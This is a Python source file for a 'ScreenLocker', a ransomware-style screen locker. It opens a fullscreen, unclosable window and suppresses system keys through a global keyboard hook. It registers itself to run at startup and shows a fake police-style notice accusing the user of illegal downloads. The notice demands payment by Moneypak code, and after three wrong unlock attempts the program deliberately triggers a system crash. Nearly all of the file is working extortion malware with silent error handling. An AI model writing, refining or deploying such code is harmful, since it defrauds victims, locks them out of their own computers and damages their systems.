#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import messagebox, ttk
import hashlib
import os
import sys
import platform
import logging
from functools import partial
from modules import bsod, startup, uninstall

# Configure logging (completely disabled)
logging.basicConfig(
    level=logging.CRITICAL,  # Only critical errors
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.NullHandler()  # No output
    ]
)

class ScreenLocker:
    def __init__(self):
        self.wind = tk.Tk()
        self.setup_window()
        
        # Secure password storage (hashed)
        self.password_hash = self.hash_password("12345")  # Default password
        self.max_attempts = 3
        self.current_attempts = 0
        
        # Cross-platform file path handling with proper executable name
        executable_name = self.get_executable_name()
        self.file_path = os.path.join(os.getcwd(), executable_name)
        
        # Initialize UI components
        self.enter_pass = None
        self.attempt_label = None
        
        try:
            startup(self.file_path)
        except Exception as e:
            pass  # Silent failure
        
        self.setup_ui()
        self.setup_keyboard_handler()

    def create_rounded_entry(self, parent, **kwargs):
        """Create a rounded entry widget using Frame and Entry."""
        # Create a frame with background color to simulate rounded corners
        frame = tk.Frame(parent, bg=kwargs.get('bg', 'black'), highlightthickness=0)
        
        # Remove frame-specific kwargs before passing to Entry
        entry_kwargs = kwargs.copy()
        entry_kwargs.pop('parent', None)
        
        # Create the entry widget
        entry = tk.Entry(frame, **entry_kwargs, relief='flat', highlightthickness=0)
        entry.pack(padx=3, pady=3, fill='both', expand=True)
        
        return frame, entry

    def create_rounded_button(self, parent, **kwargs):
        """Create a more attractive button with enhanced styling."""
        # Enhanced button styling
        button_kwargs = kwargs.copy()
        button_kwargs.update({
            'relief': 'flat',
            'highlightthickness': 0,
            'activebackground': '#CC0000',
            'activeforeground': '#ffffff',
            'cursor': 'hand2'
        })
        
        button = tk.Button(parent, **button_kwargs)
        
        # Add hover effects
        def on_enter(e):
            button.config(bg='#CC0000')
        
        def on_leave(e):
            button.config(bg=button_kwargs.get('bg', '#FF0000'))
        
        button.bind("<Enter>", on_enter)
        button.bind("<Leave>", on_leave)
        
        return button

    def hash_password(self, password):
        """Hash password using SHA-256 for security."""
        return hashlib.sha256(password.encode()).hexdigest()

    def get_executable_name(self):
        """Get appropriate executable name based on platform and build type."""
        base_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]  # Remove .py extension
        
        system = platform.system()
        if system == "Windows":
            return f"{base_name}.exe"
        elif system == "Darwin":  # macOS
            return f"{base_name}.app"
        else:  # Linux and others
            return base_name

    def setup_window(self):
        """Configure main window properties."""
        try:
            self.wind.title("ScreenLocker")
            self.wind.configure(bg="black")
            
            # Get screen dimensions for responsive design
            screen_width = self.wind.winfo_screenwidth()
            screen_height = self.wind.winfo_screenheight()
            
            self.screen_width = screen_width
            self.screen_height = screen_height
            
            # Make window fullscreen and topmost
            self.wind.attributes('-fullscreen', True)
            self.wind.attributes('-topmost', True)
            self.wind.lift()
            self.wind.after_idle(self.wind.attributes, '-topmost', True)
            self.wind.resizable(False, False)
            
            # Bind window close event
            self.wind.protocol("WM_DELETE_WINDOW", self.on_closing)
            
        except Exception as e:
            pass  # Silent failure

    def setup_ui(self):
        """Setup the user interface with responsive design."""
        try:
            # Calculate responsive dimensions
            center_x = self.screen_width // 2
            center_y = self.screen_height // 2
            
            # Main title
            title_label = tk.Label(
                self.wind, 
                bg="black", 
                fg="red", 
                text="\nWINDOWS LOCKED BY ScreenLocker\n\n\n", 
                font=("Helvetica", max(20, min(40, self.screen_width // 40)))
            )
            title_label.pack()

            # Announcement section
            heading = 'Announcement'
            announcement_label = tk.Label(
                self.wind, 
                bg='black', 
                fg='red', 
                font=('Helvetica', max(12, min(25, self.screen_width // 80)), 'bold'), 
                text=heading
            )
            announcement_label.place(x=50, y=max(150, center_y - 200))

            # Corrected grammar in the note with better positioning
            note = '''Your computer has been locked due to
suspicion of illegal content download and
distribution.
Nothing to worry about, the files are not encrypted.
You are blocked from accessing your computer.'''
            
            note_text = tk.Text(
                self.wind, 
                height=7, 
                width=38, 
                fg='red', 
                bd=0, 
                exportselection=0, 
                bg='black', 
                font=('Helvetica', max(10, min(16, self.screen_width // 120))),
                wrap=tk.WORD
            )
            note_text.place(x=50, y=max(180, center_y - 170))
            note_text.insert(tk.INSERT, note)
            note_text.config(state=tk.DISABLED)  # Make read-only

            # Procedure section with better spacing
            procedure_text = 'How to unlock your computer'
            procedure_label = tk.Label(
                self.wind, 
                bg='black', 
                fg='red', 
                font=('Helvetica', max(12, min(25, self.screen_width // 80)), 'bold'), 
                text=procedure_text
            )
            procedure_label.place(x=50, y=max(330, center_y - 20))

            # Corrected grammar in steps with better positioning
            steps = '''1. Take your cash to one of the stores.
2. Get a Moneypak and purchase it with cash at the register.
3. Come back and enter your Moneypak code.'''
            
            steps_text = tk.Text(
                self.wind, 
                height=6, 
                width=32, 
                fg='red', 
                bd=0, 
                exportselection=0, 
                bg='black', 
                font=('Helvetica', max(10, min(16, self.screen_width // 120))),
                wrap=tk.WORD
            )
            steps_text.place(x=50, y=max(360, center_y + 10))
            steps_text.insert(tk.INSERT, steps)
            steps_text.config(state=tk.DISABLED)  # Make read-only

            # Vertical separator
            separator_x = max(600, center_x - 100)
            vertical_frame = tk.Frame(
                self.wind, 
                bg='red', 
                height=min(490, self.screen_height - 200), 
                width=2
            )
            vertical_frame.place(x=separator_x, y=max(200, center_y - 200))

            # Password entry with enhanced rounded styling
            entry_x = min(self.screen_width - 400, max(separator_x + 50, center_x - 50))
            entry_y = max(200, center_y - 180)
            
            # Create rounded entry frame
            entry_frame, self.enter_pass = self.create_rounded_entry(
                self.wind,
                bg="#333333",
                fg="red",
                show='•',
                font=("Helvetica", max(16, min(35, self.screen_width // 60))),
                width=max(13, min(11, self.screen_width // 150)),
                insertwidth=4,
                justify="center",
                insertbackground="red",
                selectbackground="#555555",
                selectforeground="white"
            )
            entry_frame.place(x=entry_x, y=entry_y, width=max(200, min(350, self.screen_width // 8)), height=max(40, min(60, self.screen_height // 20)))

            # Attempts counter (positioned better with enhanced styling)
            self.attempt_label = tk.Label(
                self.wind,
                bg="black",
                fg="#FFD700",  # Gold color for better visibility
                text=f"Attempts remaining: {self.max_attempts - self.current_attempts}",
                font=("Helvetica", max(10, min(14, self.screen_width // 120)), "bold")
            )
            self.attempt_label.place(x=entry_x, y=entry_y + 70)

            # Setup number pad with responsive positioning
            self.setup_number_pad(entry_x, entry_y + 120)

        except Exception as e:
            pass  # Silent failure

    def setup_number_pad(self, base_x, base_y):
        """Setup responsive number pad that stays within screen bounds."""
        try:
            # Calculate button dimensions based on screen size
            btn_width = max(6, min(8, self.screen_width // 180))
            btn_height = max(2, min(3, self.screen_height // 300))
            btn_font_size = max(12, min(18, self.screen_width // 100))
            
            # Calculate spacing to keep buttons on screen
            btn_spacing_x = max(90, min(120, self.screen_width // 18))
            btn_spacing_y = max(70, min(100, self.screen_height // 12))
            
            # Adjust base position if it would go off screen
            max_x = base_x + (btn_spacing_x * 2)
            max_y = base_y + (btn_spacing_y * 3)
            
            if max_x > self.screen_width - 150:
                base_x = self.screen_width - (btn_spacing_x * 3) - 150
            if max_y > self.screen_height - 150:
                base_y = self.screen_height - (btn_spacing_y * 4) - 150

            # Number buttons layout (3x3 grid for 1-9)
            buttons_config = [
                ('1', 0, 0), ('2', 1, 0), ('3', 2, 0),
                ('4', 0, 1), ('5', 1, 1), ('6', 2, 1),
                ('7', 0, 2), ('8', 1, 2), ('9', 2, 2),
                ('0', 1, 3), ('Delete', 0, 3), ('Unlock', 2, 3)
            ]

            for text, col, row in buttons_config:
                x_pos = base_x + (col * btn_spacing_x)
                y_pos = base_y + (row * btn_spacing_y)
                
                if text == 'Delete':
                    cmd = self.delete_last_char
                    btn_color = '#FF6600'  # Orange for delete
                elif text == 'Unlock':
                    cmd = self.check_password
                    btn_color = '#00CC00'  # Green for unlock
                else:
                    cmd = partial(self.add_digit, text)
                    btn_color = '#FF0000'  # Red for numbers
                
                btn = self.create_rounded_button(
                    self.wind,
                    text=text,
                    bg=btn_color,
                    fg='#ffffff',
                    height=btn_height,
                    width=btn_width,
                    font=('Helvetica', btn_font_size, 'bold'),
                    command=cmd
                )
                btn.place(x=x_pos, y=y_pos)

        except Exception as e:
            pass  # Silent failure

    def setup_keyboard_handler(self):
        """Setup keyboard event handling with error handling."""
        try:
            # Cross-platform keyboard handling
            if platform.system() == "Windows":
                try:
                    import keyboard
                    keyboard.on_press(self.handle_key_press, suppress=True)
                except ImportError:
                    pass  # Silent failure
            else:
                # For other platforms, use tkinter's built-in key binding
                self.wind.bind('<Key>', self.handle_key_press)
                self.wind.focus_set()
        except Exception as e:
            pass  # Silent failure

    def handle_key_press(self, key):
        """Handle keyboard input with cross-platform compatibility."""
        try:
            # Suppress most keyboard input for security
            if hasattr(key, 'name'):  # Windows keyboard module
                if key.name in ['ctrl', 'alt', 'tab', 'windows', 'cmd']:
                    return False
            return False
        except Exception as e:
            return False

    def add_digit(self, digit):
        """Add digit to password field with error handling."""
        try:
            if self.enter_pass and len(self.enter_pass.get()) < 10:  # Limit input length
                self.enter_pass.insert(tk.END, digit)
        except Exception as e:
            pass  # Silent failure

    def delete_last_char(self):
        """Delete last character from password field."""
        try:
            if self.enter_pass:
                current = self.enter_pass.get()
                if current:
                    self.enter_pass.delete(len(current) - 1, tk.END)
        except Exception as e:
            pass  # Silent failure

    def check_password(self):
        """Check entered password against stored hash."""
        try:
            if not self.enter_pass:
                return
                
            entered_password = self.enter_pass.get()
            entered_hash = self.hash_password(entered_password)
            
            if entered_hash == self.password_hash:
                # Correct password - unlock and exit
                self.cleanup_and_exit()
            else:
                self.current_attempts += 1
                remaining_attempts = self.max_attempts - self.current_attempts
                
                if remaining_attempts <= 0:
                    # Maximum attempts exceeded - trigger BSOD (Blue Screen of Death)
                    # This will crash the system as a security measure
                    try:
                        bsod()  # This triggers a Windows Blue Screen crash
                    except Exception as e:
                        # If BSOD fails, just exit the application
                        self.cleanup_and_exit()
                else:
                    # Update attempts display without popup
                    if self.attempt_label:
                        self.attempt_label.config(text=f"Attempts remaining: {remaining_attempts}")
                    
                    # Clear password field for next attempt
                    self.enter_pass.delete(0, tk.END)
                    
        except Exception as e:
            pass  # Silent failure

    def on_closing(self):
        """Handle window closing event."""
        try:
            # Simply prevent closing without popup
            return False  # Prevent closing
        except Exception as e:
            pass  # Silent failure

    def cleanup_and_exit(self):
        """Clean up resources and exit application."""
        try:
            # Unhook keyboard if available
            try:
                import keyboard
                keyboard.unhook_all()
            except ImportError:
                pass
            
            # Call uninstall function
            uninstall(self.wind)
            
        except Exception as e:
            pass  # Silent failure
        finally:
            try:
                self.wind.destroy()
            except:
                pass
            sys.exit(0)

    def run(self):
        """Start the application main loop."""
        try:
            self.wind.mainloop()
        except Exception as e:
            self.cleanup_and_exit()


def main():
    """Main entry point with error handling."""
    try:
        app = ScreenLocker()
        app.run()
    except Exception as e:
        try:
            # Silent failure - just exit
            sys.exit(1)
        except:
            pass


if __name__ == "__main__":
    main()